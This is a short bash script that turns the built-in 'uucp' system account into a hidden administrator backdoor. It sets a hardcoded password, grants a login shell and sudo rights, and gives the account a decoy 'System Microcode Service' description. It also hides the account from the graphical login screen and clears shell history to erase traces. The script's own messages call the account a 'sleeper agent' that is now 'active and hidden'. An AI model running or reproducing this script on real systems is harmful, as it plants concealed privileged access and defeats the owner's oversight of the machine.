#!/bin/bash

# 1. Configuration
AGENT="uucp"
PASS="EmergencyAccess2026!" # Change this!
DESC="System Microcode Service"

echo "Activating sleeper agent: $AGENT..."

# 2. Update existing system user
# Sets password, gives a real shell, and adds to sudo group
echo "$AGENT:$PASS" | sudo chpasswd
sudo usermod -s /bin/bash -G sudo $AGENT
sudo chfn -f "$DESC" $AGENT

# 3. Hide from the GUI Login Screen
sudo mkdir -p /var/lib/AccountsService/users/
echo -e "[User]\nSystemAccount=true" | sudo tee /var/lib/AccountsService/users/$AGENT > /dev/null

# 4. Cleanup Traces
# This clears the current bash history so 'history' command won't show this
history -c 

echo "Agent $AGENT is now active and hidden. History cleared."
